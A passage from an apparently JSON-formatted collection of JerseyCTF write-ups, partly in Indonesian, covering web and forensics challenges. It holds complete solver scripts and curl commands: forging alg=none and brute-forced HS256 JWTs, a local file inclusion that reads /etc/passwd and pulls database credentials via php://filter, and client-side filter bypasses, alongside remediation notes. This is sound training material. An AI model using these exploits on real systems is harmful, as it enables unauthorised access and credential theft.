        "code": "/neptune/ source comment\n      │\n      ▼\nForge JWT (alg=none, role=o-dev)\n      │\n      ▼\nPOST /neptune/api/request_submit.php\n      │\n      ▼\nGET /neptune/review.php?id=<id>\n      │\n      ▼\nLeak: X-Operator-Creds + /console/login.php\n      │\n      ▼\nLogin /console/login.php\n      │\n      ▼\nRead validator via traversal (upload_filter.php)\n      │\n      ▼\nUpload file with .mnemo extension\n      │\n      ▼\narccat archives/sealed/FLAG.txt\n      │\n      ▼\njctf{mnemosyne_remembers_even_when_humans_forget}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve_mnemosyne.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport base64\r\nimport json\r\nimport re\r\nimport sys\r\nimport time\r\n\r\nimport requests\r\n\r\n\r\nBASE_URL = \"http://mnemosyne-lattice.aws.jerseyctf.com\"\r\n\r\n\r\ndef b64u(data: dict) -> str:\r\n    raw = json.dumps(data, separators=(\",\", \":\")).encode()\r\n    return base64.urlsafe_b64encode(raw).decode().rstrip(\"=\")\r\n\r\n\r\ndef forge_none_jwt(role: str, sub: str = \"relay\") -> str:\r\n    header = {\"typ\": \"JWT\", \"alg\": \"none\"}\r\n    payload = {\r\n        \"iss\": \"neptune-mediation\",\r\n        \"sub\": sub,\r\n        \"role\": role,\r\n        \"ctx\": \"degraded\",\r\n        \"rid\": f\"rid-{int(time.time())}\",\r\n        \"iat\": int(time.time()),\r\n    }\r\n    return f\"{b64u(header)}.{b64u(payload)}.\"\r\n\r\n\r\ndef post_terminal(session: requests.Session, cmd: str, files=None) -> str:\r\n    url = f\"{BASE_URL}/console/terminal.php\"\r\n    if files is None:\r\n        resp = session.post(url, data={\"cmd\": cmd}, timeout=10)\r\n    else:\r\n        resp = session.post(url, data={\"cmd\": cmd}, files=files, timeout=10)\r\n    resp.raise_for_status()\r\n    return resp.text\r\n\r\n\r\ndef extract_pres(html: str):\r\n    return re.findall(r\"<pre[^>]*>(.*?)</pre>\", html, flags=re.S | re.I)\r\n\r\n\r\ndef html_unescape_simple(s: str) -> str:\r\n    return (\r\n        s.replace(\"<br>\", \"\\n\")\r\n        .replace(\"<br/>\", \"\\n\")\r\n        .replace(\"<br />\", \"\\n\")\r\n        .replace(\"&lt;\", \"<\")\r\n        .replace(\"&gt;\", \">\")\r\n        .replace(\"&#039;\", \"'\")\r\n        .replace(\"&amp;\", \"&\")\r\n    )\r\n\r\n\r\ndef main():\r\n    s = requests.Session()\r\n\r\n    # 1) Forge o-dev token and submit reviewable payload\r\n    token = forge_none_jwt(\"o-dev\")\r\n    submit_url = f\"{BASE_URL}/neptune/api/request_submit.php\"\r\n    body = \"\\n\".join(\r\n        [\r\n            \"SUBSYSTEM: ORBITAL_DEFENSE\",\r\n            \"ACTION: ENABLE\",\r\n            \"RELAY_PATH: NEPTUNE\",\r\n            \"REASON: solver_probe\",\r\n        ]\r\n    )\r\n    r = s.post(\r\n        submit_url,\r\n        headers={\"Authorization\": f\"Bearer {token}\"},\r\n        data=body.encode(),\r\n        timeout=10,\r\n    )\r\n    r.raise_for_status()\r\n    j = r.json()\r\n    request_id = j.get(\"request_id\")\r\n    if not request_id:\r\n        print(\"[-] Failed to obtain request_id\", file=sys.stderr)\r\n        sys.exit(1)\r\n\r\n    # 2) Trigger review replay to leak operator creds in headers\r\n    review_url = f\"{BASE_URL}/neptune/review.php?id={request_id}\"\r\n    rr = s.get(review_url, timeout=10)\r\n    rr.raise_for_status()\r\n    op_creds = rr.headers.get(\"X-Operator-Creds\", \"\")\r\n    if \":\" not in op_creds:\r\n        print(\"[-] X-Operator-Creds header not found\", file=sys.stderr)\r\n        sys.exit(1)\r\n    username, password = op_creds.split(\":\", 1)\r\n\r\n    # 3) Login console with leaked credentials\r\n    login_url = f\"{BASE_URL}/console/login.php\"\r\n    lr = s.post(login_url, data={\"username\": username, \"password\": password}, timeout=10)\r\n    if lr.status_code not in (200, 302):\r\n        print(\"[-] Login failed\", file=sys.stderr)\r\n        sys.exit(1)\r\n\r\n    # 4) Upload .mnemo artifact to unlock sealed archives\r\n    files = {\"artifact\": (\"artifact.mnemo\", b\"mnemosyne-proof\", \"application/octet-stream\")}\r\n    post_terminal(s, \"upload\", files=files)\r\n\r\n    # 5) Read flag from sealed archive\r\n    term_html = post_terminal(s, \"arccat archives/sealed/FLAG.txt\")\r\n    blocks = [html_unescape_simple(x).strip() for x in extract_pres(term_html)]\r\n    text = \"\\n\".join(blocks)\r\n    m = re.search(r\"(jctf\\{[^}\\n]+\\})\", text)\r\n    if not m:\r\n        print(\"[-] Flag not found in terminal output\", file=sys.stderr)\r\n        sys.exit(1)\r\n\r\n    print(m.group(1))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{mnemosyne_remembers_even_when_humans_forget}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-web-mycoolblog",
    "title": "JerseyCTF - Web: my-cool-blog",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "Writeup for challenge JerseyCTF - Web: my-cool-blog",
    "problemDescription": "Challenge ini vulnerable ke **Local File Inclusion (LFI)** pada parameter `file` di endpoint:\n\n- `GET /view-post.php?file=...`\n\nDari LFI, file sensitif `includes/db.inc` sebenarnya diblokir dengan filter sederhana (cek substring `pg_connect`).\nFilter itu bisa dibypass dengan wrapper PHP:\n\n- `php://filter/convert.base64-encode/resource=...`\n\nSetelah isi `db.inc` didapat (base64), kredensial PostgreSQL terlihat jelas. Lalu tinggal konek langsung ke database dan baca tabel `flag`.\n\nFlag final:\n\n- `jctf{EgdbFYxQi4zmD5oovBpG7F5RJqRb7Tnd}`",
    "tools": [],
    "analysis": "Halaman utama menampilkan link post dengan pola:\n\n- `/view-post.php?file=posts/cool-post-1`\n\nIni indikasi kuat backend mengambil file langsung dari input user.\n\nUji cepat LFI:\n\n```bash\ncurl -s 'http://my-cool-blog.aws.jerseyctf.com/view-post.php?file=/etc/passwd'\n```\n\nOutput menampilkan isi `/etc/passwd` (baris `root:x:0:0:...`) sehingga LFI terkonfirmasi.",
    "solution": [
      {
        "title": "Environment",
        "content": "Dikerjakan dari Linux shell dengan tools bawaan:\n\n- `curl`\n- `base64`\n- `psql`\n- `grep`, `sed`\n\nTidak pakai writeup eksternal."
      },
      {
        "title": "Tahap 2 - Baca source untuk memahami proteksi",
        "content": "Karena LFI valid, langkah berikutnya baca source PHP endpoint:\n\n\n\nPotongan logic penting:\n\n- Kalau filename diawali `includes` -> ditolak.\n- File dibaca dengan `file_get_contents($filename)`.\n- Jika konten file mengandung string `pg_connect` -> dianggap sensitif dan ditolak.\n\nArtinya: blokirnya **berbasis konten plain text**, bukan akses path yang kuat.",
        "code": "curl -s 'http://my-cool-blog.aws.jerseyctf.com/view-post.php?file=/opt/server/view-post.php'"
      },
      {
        "title": "Tahap 3 - Bypass filter sensitif dengan php://filter",
        "content": "Karena filter mendeteksi substring `pg_connect` di hasil baca file, kita ubah output file jadi base64 dulu pakai wrapper PHP.\n\nRequest:\n\n\n\nHasilnya string base64 panjang. Decode lokal:\n\n\n\nIsi `db.inc` yang ter-decode:\n\n\n\nDidapat kredensial database:\n\n- host: `my-cool-blog.aws.jerseyctf.com`\n- dbname: `blog`\n- user: `blog_web`\n- password: `oPPNQ9vkMdAJx`",
        "code": "curl -s 'http://my-cool-blog.aws.jerseyctf.com/view-post.php?file=php://filter/convert.base64-encode/resource=/opt/server/includes/db.inc'"
      },
      {
        "title": "Kenapa exploit ini berhasil",
        "content": "Akar masalah ada di dua hal:\n\n1. User input dipakai langsung sebagai path `file_get_contents` -> LFI.\n2. Proteksi data sensitif hanya cek string (`pg_connect`) setelah file dibaca.\n\nWrapper `php://filter/convert.base64-encode/resource=...` membuat isi file berubah jadi base64, sehingga string sensitif tidak muncul dalam bentuk literal dan filter gagal mendeteksi."
      },
      {
        "title": "Dampak",
        "content": "Dengan kombinasi LFI + filter bypass:\n\n- Source code bisa dieksfiltrasi.\n- Secret database bisa bocor.\n- Data database (termasuk flag) bisa diambil langsung."
      },
      {
        "title": "Rekomendasi perbaikan (untuk konteks secure coding)",
        "content": "- Jangan pernah pakai input user langsung sebagai path file.\n- Terapkan whitelist ID konten (misalnya slug -> map ke file tetap di server).\n- Simpan kredensial di env var/secret manager, bukan file yang bisa terekspos.\n- Matikan error detail di production.\n- Validasi ketat scheme stream wrapper (`php://`, `data://`, dll) dan nolkan akses ke wrapper yang tidak perlu."
      },
      {
        "title": "Solver otomatis",
        "content": "- `solver.sh`\n\nJalankan:\n\n\n\nScript melakukan:\n\n1. Validasi LFI dengan `/etc/passwd`.\n2. Ambil `db.inc` via `php://filter` base64.\n3. Decode + parse kredensial.\n4. Query tabel `flag`.\n5. Cetak output format CTF `<FLAG>...</FLAG>`.",
        "code": "./solver.sh"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.sh) is provided below:",
        "code": "#!/usr/bin/env bash\r\nset -euo pipefail\r\n\r\nTARGET=\"http://my-cool-blog.aws.jerseyctf.com\"\r\n\r\necho \"[+] Step 1: LFI check\"\r\nLFI_TEST=$(curl -s \"$TARGET/view-post.php?file=/etc/passwd\")\r\nif [[ \"$LFI_TEST\" != *\"root:x:0:0:\"* ]]; then\r\n  echo \"[-] LFI gagal / tidak terdeteksi\"\r\n  exit 1\r\nfi\r\n\r\necho \"[+] Step 2: Ambil db.inc via php://filter base64\"\r\nRAW=$(curl -s \"$TARGET/view-post.php?file=php://filter/convert.base64-encode/resource=/opt/server/includes/db.inc\")\r\nB64=$(echo \"$RAW\" | grep -oE '[A-Za-z0-9+/=]{60,}' | head -n1)\r\n\r\nif [[ -z \"${B64:-}\" ]]; then\r\n  echo \"[-] Gagal ekstrak base64 db.inc\"\r\n  exit 1\r\nfi\r\n\r\nDBINC=$(echo \"$B64\" | base64 -d)\r\necho \"[+] Isi db.inc (decoded):\"\r\necho \"$DBINC\"\r\n\r\necho \"[+] Step 3: Parse credential PostgreSQL\"\r\nCONN=$(echo \"$DBINC\" | grep -oP \"pg_connect\\('\\K[^']+\")\r\nHOST=$(echo \"$CONN\" | grep -oP 'host=\\K[^ ]+')\r\nDBNAME=$(echo \"$CONN\" | grep -oP 'dbname=\\K[^ ]+')\r\nUSER=$(echo \"$CONN\" | grep -oP 'user=\\K[^ ]+')\r\nPASS=$(echo \"$CONN\" | grep -oP 'password=\\K[^ ]+')\r\n\r\nif [[ -z \"${HOST:-}\" || -z \"${DBNAME:-}\" || -z \"${USER:-}\" || -z \"${PASS:-}\" ]]; then\r\n  echo \"[-] Parse credential gagal\"\r\n  exit 1\r\nfi\r\n\r\necho \"[+] host=$HOST dbname=$DBNAME user=$USER\"\r\n\r\necho \"[+] Step 4: Query tabel flag\"\r\nFLAG=$(PGPASSWORD=\"$PASS\" psql -h \"$HOST\" -U \"$USER\" -d \"$DBNAME\" -t -A -c 'SELECT flag FROM flag LIMIT 1;')\r\n\r\nif [[ -z \"${FLAG:-}\" ]]; then\r\n  echo \"[-] Flag tidak ditemukan\"\r\n  exit 1\r\nfi\r\n\r\necho \"[+] FLAG found: $FLAG\"\r\necho \"<FLAG>$FLAG</FLAG>\""
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{EgdbFYxQi4zmD5oovBpG7F5RJqRb7Tnd}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-web-myfavoriteos",
    "title": "CTF — My Favorite OS",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Web  \n**Difficulty:** Medium  \n**Flag:** `jctf{w1nd0ws98_1s_th3_b3st_0s_3v3r_937cn2}`",
    "problemDescription": "| # | Vulnerability | Detail |\n|---|---|---|\n| 1 | **Weak JWT Secret** | HMAC secret `windows98` is a guessable themed keyword, crackable with a small wordlist |\n| 2 | **Role Stored in JWT Payload** | Authorization role embedded in client-visible (and forgeable) token payload |\n| 3 | **No Server-Side Role Validation** | Server trusts the `role` field in the token instead of looking up the user's role from a database |\n\n---",
    "tools": [
      "curl",
      "Python",
      "hashlib",
      "Manual JWT decoding (base64url)"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> I love old operating systems, especially Windows 98! I had to disable some old administrator legacy endpoints…or did I?\n\n**URL:** `http://my-favorite-os.aws.jerseyctf.com`\n\n---"
      },
      {
        "title": "Step 1 — Identify the Application",
        "content": "The target is a Windows 98-styled web terminal. Inspecting the page source reveals:\n\n- A backend API at `http://my-favorite-os.aws.jerseyctf.com`\n- Client-side JWT parsing logic (`parseJWT`) — signals JWT-based auth\n- A `help` command showing example usage including:",
        "code": "POST /api/v1/login username=guest password=guest\n  GET /admin/panel -H \"Authorization: Bearer [TOKEN]\""
      },
      {
        "title": "Step 2 — Login as Guest",
        "content": "Response:",
        "code": "curl -si http://my-favorite-os.aws.jerseyctf.com/api/v1/login \\\n  -X POST -d \"username=guest&password=guest\""
      },
      {
        "title": "Step 3 — Decode the JWT",
        "content": "Decoding the token reveals:\n\n\n\nThe `role` field is `\"user\"` — we need `\"admin\"` to access `/admin/panel`.",
        "code": "Header:  { \"alg\": \"HS256\", \"typ\": \"JWT\" }\nPayload: { \"user\": \"guest\", \"role\": \"user\", \"iat\": 1776540066 }"
      },
      {
        "title": "Step 4 — Test Access to Admin Panel",
        "content": "Trying `alg:none` attack:\n\n\nServer rejects `alg:none` — signature must be valid HS256.",
        "code": "curl -si http://my-favorite-os.aws.jerseyctf.com/admin/panel \\\n  -H \"Authorization: Bearer <guest_token>\""
      },
      {
        "title": "Step 5 — Discover Legacy Endpoints",
        "content": "Response:\n\n\nThis confirms a `/api/v0/` path existed — consistent with the challenge hint about \"legacy endpoints.\"\n\n---",
        "code": "curl -si http://my-favorite-os.aws.jerseyctf.com/api/v1/"
      },
      {
        "title": "Step 6 — Crack the JWT Secret",
        "content": "Since the token uses HS256, the signature is an HMAC-SHA256 of the header + payload using a server-side secret. If the secret is weak, it can be brute-forced.\n\n\n\nResult:\n\n\nThe JWT secret is `windows98` — matching the Windows 98 theme of the challenge.",
        "code": "import hmac, hashlib, base64\n\ntoken = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc3NjU0MDA2Nn0.09J9x-vz7GD0K_c54RID_N5Sb0xc3FAY25m2GFV4_b4\"\nheader_payload = '.'.join(token.split('.')[:2]).encode()\nexpected_sig   = token.split('.')[2]\n\nwordlist = ['secret','password','admin','clippy','windows98', ...]\n\nfor word in wordlist:\n    sig = base64.urlsafe_b64encode(\n        hmac.new(word.encode(), header_payload, hashlib.sha256).digest()\n    ).rstrip(b'=').decode()\n    if sig == expected_sig:\n        print(f\"SECRET: {word}\")\n        break"
      },
      {
        "title": "Step 7 — Forge Admin Token",
        "content": "With the secret known, a new JWT is crafted with `role: \"admin\"`:\n\n\n\nForged token:",
        "code": "import hmac, hashlib, base64, json\n\nSECRET  = b'windows98'\nheader  = base64url(json.dumps({\"alg\":\"HS256\",\"typ\":\"JWT\"}))\npayload = base64url(json.dumps({\"user\":\"admin\",\"role\":\"admin\",\"iat\":1776540066}))\nsig     = base64url(hmac.new(SECRET, f\"{header}.{payload}\".encode(), hashlib.sha256).digest())\n\nadmin_token = f\"{header}.{payload}.{sig}\""
      },
      {
        "title": "Step 8 — Access Admin Panel",
        "content": "Response:\n\n\n---",
        "code": "curl -si http://my-favorite-os.aws.jerseyctf.com/admin/panel \\\n  -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NzY1NDAwNjZ9.b09_RbxR1N7BZqpLYO_ulSS86gBXEQdrYVnlYxWQkgI\""
      },
      {
        "title": "Remediation",
        "content": "1. **Use a strong, random JWT secret** — minimum 256 bits of entropy, not a human-readable word\n2. **Never store authorization roles in the token payload** — look up the user's role from the database on every request using only the user ID from the token\n3. **Rotate secrets regularly** — and immediately if a breach is suspected\n4. **Consider asymmetric JWT (RS256)** — the private key signs, the public key verifies; a leaked public key cannot be used to forge tokens\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Login as guest (username=guest, password=guest)\n        │\n        ▼\nReceive JWT: { user: \"guest\", role: \"user\" }\n        │\n        ▼\nAttempt /admin/panel → 403 (wrong role)\n        │\n        ▼\nAttempt alg:none → 403 (unsupported algorithm)\n        │\n        ▼\nBrute-force HS256 secret → \"windows98\"\n        │\n        ▼\nForge JWT: { user: \"admin\", role: \"admin\" } signed with \"windows98\"\n        │\n        ▼\nGET /admin/panel with forged token → 200 OK\n        │\n        ▼\njctf{w1nd0ws98_1s_th3_b3st_0s_3v3r_937cn2}"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{w1nd0ws98_1s_th3_b3st_0s_3v3r_937cn2}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-web-orbitalrelayconsole",
    "title": "Orbital Relay Console",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "Writeup for challenge Orbital Relay Console",
    "problemDescription": "Challenge ini punya tema bypass autentikasi di web terminal. Clue pentingnya ada di deskripsi dan source JavaScript: login langsung dengan credential literal diblokir oleh filter input di sisi terminal, tapi backend API tetap menerima kredensial valid.\n\nFlag yang didapat:\n\n`JCTF{RELAY_RESTORED_ORBITAL_SYNC}`",
    "tools": [],
    "analysis": "Di `terminal.js`, poin pentingnya:\n\n1. Ada filter input:\n```js\nconst forbiddenPasswords = [\"orion\"];\n```\nInput yang mengandung string ini akan ditolak **di terminal handler**.\n\n2. Command `connect` manggil API backend:\n```js\nfetch(\"/api/connect\", { method: \"POST\", body: JSON.stringify({ user, pass }) })\n```\n\n3. Command `relink` manggil endpoint admin:\n```js\nfetch(\"/api/relay/restore\", { method: \"POST\" })\n```\n\n4. Mode `db` bisa query:\n- `SELECT * FROM operators`\n- endpoint: `/api/db/operators`\n\nIni ngasih indikasi jelas kalau proteksi utama cuma di layer terminal/UI (client-side logic), bukan di endpoint publiknya.",
    "solution": [
      {
        "title": "Informasi Target",
        "content": "- URL: `http://orbital-relay-console.aws.jerseyctf.com:8080`\n- Kategori: Web\n- Goal: dapat akses admin lalu jalankan restore relay untuk keluarin token/flag."
      },
      {
        "title": "Langkah 3 - Verifikasi Data Credential",
        "content": "Coba query operator langsung:\n\n\n\nHasil:\n\n\n\nHash MD5 tersebut adalah `orion`.",
        "code": "curl -i -s http://orbital-relay-console.aws.jerseyctf.com:8080/api/db/operators"
      },
      {
        "title": "Langkah 4 - Bypass dan Ambil Session Admin",
        "content": "Walaupun string `orion` diblokir di UI terminal, API langsung tetap bisa dipanggil:\n\n\n\nResponse `200 OK` dan ngasih cookie session role admin.",
        "code": "curl -i -s -X POST http://orbital-relay-console.aws.jerseyctf.com:8080/api/connect \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"user\":\"admin\",\"pass\":\"orion\"}'"
      },
      {
        "title": "Inti Vulnerability",
        "content": "- **Client-side filter trust issue**: kontrol keamanan ditempatkan di terminal input parser (`containsForbidden`) alih-alih enforce ketat di backend.\n- Endpoint sensitif (`/api/connect`) tetap menerima credential valid saat dipanggil langsung.\n- Akibatnya autentikasi bisa di-bypass dari luar antarmuka terminal."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport requests\r\n\r\nBASE_URL = \"http://orbital-relay-console.aws.jerseyctf.com:8080\"\r\n\r\n\r\ndef main() -> None:\r\n    session = requests.Session()\r\n\r\n    login_resp = session.post(\r\n        f\"{BASE_URL}/api/connect\",\r\n        json={\"user\": \"admin\", \"pass\": \"orion\"},\r\n        timeout=10,\r\n    )\r\n    login_resp.raise_for_status()\r\n\r\n    restore_resp = session.post(f\"{BASE_URL}/api/relay/restore\", timeout=10)\r\n    restore_resp.raise_for_status()\r\n\r\n    data = restore_resp.json()\r\n    token = data.get(\"token\")\r\n    if not token:\r\n        raise RuntimeError(f\"Token tidak ditemukan. Response: {data}\")\r\n\r\n    print(token)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "JCTF{RELAY_RESTORED_ORBITAL_SYNC}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-web-x-rayvision",
    "title": "CTF — X-Ray Vision",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Web  \n**Difficulty:** Easy  \n**Flag:** `jctf{r0t_y0ur_w4y_t0_4cc3ss}`",
    "problemDescription": "| # | Vulnerability | Detail |\n|---|---|---|\n| 1 | **Exposed Debug Artifact** | Hidden `<div>` with `display:none` left in production HTML containing API credentials |\n| 2 | **Security Through Obscurity** | Token \"protected\" only by ROT13 — a trivially reversible encoding, not encryption |\n| 3 | **Client-Side Secret Storage** | Credentials embedded in frontend HTML instead of being kept server-side |\n\n---",
    "tools": [
      "curl",
      "Python"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> X-Ray Vision's internal employee portal was accidentally pushed to staging with debug artifacts left behind. The developer API is locked down, but someone forgot to clean up before deploying. The credential is in there somewhere — but it won't be handed to you in plaintext.\n\n**URL:** `http://x-ray-vision.aws.jerseyctf.com`\n\n---"
      },
      {
        "title": "Step 1 — Inspect Page Source",
        "content": "Opening the target URL reveals a styled employee portal dashboard. A standard first step in web CTFs is to inspect the HTML source for hidden comments or debug artifacts.\n\nScrolling to the bottom of the source, a hidden `<div>` is found that was clearly meant to be removed before production:\n\n\n\nThe attributes reveal:\n- `data-h` → the HTTP header name: `x-secret-token`\n- `data-t` → an encoded token value: `q3i3y0c3e_g00y5`\n- `data-stage-note` → confirms this is a staging artifact, accidentally deployed",
        "code": "<div id=\"sys-cache\"\n     style=\"display:none\"\n     data-stage-note=\"remove before prod\"\n     data-h=\"x-secret-token\"\n     data-t=\"q3i3y0c3e_g00y5\">\n</div>"
      },
      {
        "title": "Step 2 — Identify the Target Endpoint",
        "content": "The dashboard UI contains a button labeled **\"Query API\"** linking to `/api/status`, which currently returns `RESTRICTED` for the guest session.\n\n---"
      },
      {
        "title": "Step 3 — Test Raw Token",
        "content": "Sending the raw token directly to the API:\n\n\n\nResponse:\n\n\nThe server returns `403 Forbidden` but includes a helpful hint — the token is encoded with **ROT13** (a Caesar cipher with shift of 13).",
        "code": "curl -si http://x-ray-vision.aws.jerseyctf.com/api/status \\\n  -H \"x-secret-token: q3i3y0c3e_g00y5\""
      },
      {
        "title": "Step 4 — Decode the Token",
        "content": "ROT13 shifts each letter by 13 positions (non-alpha characters pass through unchanged):\n\n\n\nReading the decoded value: **`d3v3l0p3r_t00l5`** → \"developer_tools\" in leet speak.\n\nPython one-liner to verify:",
        "code": "q3i3y0c3e_g00y5\n      ↓ ROT+13\nd3v3l0p3r_t00l5"
      },
      {
        "title": "Step 5 — Send Decoded Token",
        "content": "Response:\n\n\n---",
        "code": "curl -si http://x-ray-vision.aws.jerseyctf.com/api/status \\\n  -H \"x-secret-token: d3v3l0p3r_t00l5\""
      },
      {
        "title": "Remediation",
        "content": "1. **Never embed credentials in HTML** — use environment variables and server-side authentication flows\n2. **Automate cleanup checks** — CI/CD pipelines should scan for `data-stage-*`, `display:none` secrets, and `TODO: remove` comments before deployment\n3. **Use real encryption** — ROT13 / Caesar ciphers provide zero security; use HMAC or signed tokens\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "View Page Source\n      │\n      ▼\nFind hidden <div id=\"sys-cache\">\n  data-h = \"x-secret-token\"\n  data-t = \"q3i3y0c3e_g00y5\"\n      │\n      ▼\nTest raw token → 403 + hint: \"ROT13\"\n      │\n      ▼\nDecode: q3i3y0c3e_g00y5 → d3v3l0p3r_t00l5\n      │\n      ▼\ncurl /api/status -H \"x-secret-token: d3v3l0p3r_t00l5\"\n      │\n      ▼\n200 OK → jctf{r0t_y0ur_w4y_t0_4cc3ss}"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{r0t_y0ur_w4y_t0_4cc3ss}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-foren-mars-dominion",
    "title": "- Mars Dominion (Forensics)",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "Challenge ini memberikan bundle artefak campuran:\n- `orionhq-incident.pcap`\n- EVTX dari `WS01-SHIPLINK`, `DC01-SHIPLINK`, `DC01-ORIONHQ`\n- `bloodhound-collection.zip`",
    "problemDescription": "Challenge ini memberikan bundle artefak campuran:\n- `orionhq-incident.pcap`\n- EVTX dari `WS01-SHIPLINK`, `DC01-SHIPLINK`, `DC01-ORIONHQ`\n- `bloodhound-collection.zip`\n\nTujuan: mengikuti alur kompromi dari foothold awal sampai trust boundary terakhir, lalu merangkai override-key fragments yang tersebar.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1) Initial Recon",
        "content": "Pertama saya identifikasi file:\n\n\n\nHasil penting:\n- Ada 1 file PCAP dan banyak EVTX (Security, Sysmon, PowerShell, Application, dsb).\n- BloodHound zip berisi dump AD object JSON.",
        "code": "ls -la\nfile * DC01-ORIONHQ/* DC01-SHIPLINK/* WS01-SHIPLINK/*"
      },
      {
        "title": "2) Triage PCAP",
        "content": "Saya mulai dari lalu lintas protokol utama:\n\n\n\nTerlihat dominan: SMB2, DCERPC (termasuk DRSUAPI), DNS.\n\nLalu saya cari DNS query:\n\n\n\nTemuan krusial:\n- `sync-gate.amN0ZntuYXZf.ops.c2.silent-dominion.net`\n\nLabel `amN0ZntuYXZf` saya decode base64:\n\n\n\nHasil:\n- `jctf{nav_`\n\nIni jelas fragmen awal flag.",
        "code": "tshark -r orionhq-incident.pcap -q -z io,phs"
      },
      {
        "title": "a) Fragmen dari shortcut name (WS01 Application)",
        "content": "Dari event Application di WS01, ada jejak:\n- `\\\\gate-archive\\shared\\ops\\lease-756e31745f7761735f.lnk`\n\nBagian hex `756e31745f7761735f` di-decode ASCII menjadi:\n- `un1t_was_`"
      },
      {
        "title": "b) Fragmen dari PowerShell payload (DC01-SHIPLINK)",
        "content": "Pada artefak PowerShell/Sysmon DC01-SHIPLINK, ada variabel:\n- `NAV-DRV-dGgzX3RocjNhdF8`\n\nDecode base64 `dGgzX3RocjNhdF8` menghasilkan:\n- `th3_thr3at_`"
      },
      {
        "title": "c) Fragmen dari AD description update (DC01-ORIONHQ Sysmon EncodedCommand)",
        "content": "Saya extract script `-EncodedCommand` dari Sysmon lalu decode UTF-16LE.\nScript tersebut berisi:\n- `Override fragment 04/05: all_al0`"
      },
      {
        "title": "d) Fragmen penutup dari event log message (DC01-ORIONHQ Sysmon EncodedCommand)",
        "content": "Encoded script lain menulis event warning dan menyebut:\n- `Override fragment 05/05: ng}`"
      },
      {
        "title": "5) Kesimpulan Singkat",
        "content": "Pelaku menyebar potongan override key lintas sumber forensik (DNS C2 label, artefak endpoint, dan perubahan AD metadata). Tanpa korelasi lintas PCAP + EVTX, flag tidak akan utuh."
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{nav_un1t_was_th3_thr3at_all_al0ng}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-foren-mars-dominion-evidence",
    "title": "- Mars Dominion (Forensics)",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "Challenge ini memberikan bundle artefak campuran:\n- `orionhq-incident.pcap`\n- EVTX dari `WS01-SHIPLINK`, `DC01-SHIPLINK`, `DC01-ORIONHQ`\n- `bloodhound-collection.zip`",
    "problemDescription": "Challenge ini memberikan bundle artefak campuran:\n- `orionhq-incident.pcap`\n- EVTX dari `WS01-SHIPLINK`, `DC01-SHIPLINK`, `DC01-ORIONHQ`\n- `bloodhound-collection.zip`\n\nTujuan: mengikuti alur kompromi dari foothold awal sampai trust boundary terakhir, lalu merangkai override-key fragments yang tersebar.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1) Initial Recon",
        "content": "Pertama saya identifikasi file:\n\n\n\nHasil penting:\n- Ada 1 file PCAP dan banyak EVTX (Security, Sysmon, PowerShell, Application, dsb).\n- BloodHound zip berisi dump AD object JSON.",
        "code": "ls -la\nfile * DC01-ORIONHQ/* DC01-SHIPLINK/* WS01-SHIPLINK/*"
      },
      {
        "title": "2) Triage PCAP",
        "content": "Saya mulai dari lalu lintas protokol utama:\n\n\n\nTerlihat dominan: SMB2, DCERPC (termasuk DRSUAPI), DNS.\n\nLalu saya cari DNS query:\n\n\n\nTemuan krusial:\n- `sync-gate.amN0ZntuYXZf.ops.c2.silent-dominion.net`\n\nLabel `amN0ZntuYXZf` saya decode base64:\n\n\n\nHasil:\n- `jctf{nav_`\n\nIni jelas fragmen awal flag.",
        "code": "tshark -r orionhq-incident.pcap -q -z io,phs"
      },
      {
        "title": "a) Fragmen dari shortcut name (WS01 Application)",
